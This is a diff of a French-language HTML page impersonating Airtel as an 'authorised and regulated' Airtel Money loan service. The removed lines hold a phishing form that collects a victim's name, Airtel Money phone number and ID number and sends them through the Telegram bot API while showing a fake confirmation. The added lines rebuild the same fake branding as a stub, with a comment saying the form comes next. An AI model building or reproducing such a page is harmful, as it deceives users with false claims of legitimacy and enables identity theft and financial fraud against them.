@@ -1,50 +1,24 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Prêts Airtel - Autorisé et Réglementé</title>
 <style>
-body{font-family:Arial;margin:0;background:#f5f5f5}
-header{background:#e40000;color:white;padding:25px;text-align:center}
-.badge{background:white;color:#e40000;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:bold;display:inline-block;margin-top:8px}
-.container{max-width:480px;background:white;margin:20px auto;padding:25px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1)}
-label{font-weight:bold;display:block;margin-top:14px;font-size:14px}
-input,select{width:100%;padding:13px;margin:6px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
-button{width:100%;background:#e40000;color:white;padding:15px;border:none;border-radius:8px;font-size:17px;font-weight:bold;margin-top:20px}
-#msg{display:none;padding:15px;border-radius:8px;margin-top:15px;text-align:center}
-.success{background:#d4edda;color:#155724} .error{background:#f8d7da;color:#721c24}
-.footer{text-align:center;padding:15px;color:#888;font-size:11px}
+body{margin:0;font-family:Arial;background:#f5f5f5}
+.header{background:#e40000;color:white;text-align:center;padding:30px}
+.header h1{margin:0}
+.box{max-width:500px;background:white;margin:20px auto;padding:25px;border-radius:10px}
 </style>
 </head>
 <body>
-<header>
+<div class="header">
 <h1>Prêts Airtel</h1>
 <p>Autorisé et Réglementé</p>
-<div class="badge">100% SÉCURISÉ</div>
-</header>
-<div class="container">
-<h2>Demande de Prêt Airtel Money</h2>
-<label>Nom Complet</label><input id="name" placeholder="Ex: Jean Kabila">
-<label>Numéro Airtel Money</label><input id="phone" placeholder="Ex: +243 9...">
-<label>Numéro ID</label><input id="idno" placeholder="Votre ID">
-<label>Montant</label><select id="amount"><option>50 000 FC</option><option>100 000 FC</option><option>200 000 FC</option><option>500 000 FC</option><option>1 000 000 FC</option></select>
-<label>Type</label><select id="type"><option>Prêt d'Urgence</option><option>Prêt Business</option></select>
-<button onclick="sendToTelegram()">Demander Maintenant</button>
-<div id="msg"></div>
 </div>
-<div class="footer">© 2026 Prêts Airtel - Autorisé et Réglementé</div>
-<script>
-const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
-const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
-async function sendToTelegram(){
- const name=document.getElementById('name').value; const phone=document.getElementById('phone').value; const idno=document.getElementById('idno').value; const amount=document.getElementById('amount').value; const type=document.getElementById('type').value; const msgBox=document.getElementById('msg');
- if(!name||!phone){msgBox.style.display='block';msgBox.className='error';msgBox.innerText='Remplissez tous les champs';return;}
- const text=`🚨 NOUVELLE DEMANDE - PRETS AIRTEL 🚨%0A%0ANom: ${name}%0ATel: ${phone}%0AID: ${idno}%0AMontant: ${amount}%0AType: ${type}`;
- msgBox.style.display='block';msgBox.className='success';msgBox.innerText='Envoi en cours...';
- await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
- msgBox.innerText='✅ Demande reçue! Vous recevrez confirmation Airtel Money.';
-}
-</script>
+<div class="box">
+<h2>Bienvenue sur Prêts Airtel</h2>
+<p>Service de prêt rapide via Airtel Money. 100% sécurisé.</p>
+<!-- WE WILL ADD FORM HERE NEXT -->
+</div>
 </body>
 </html>
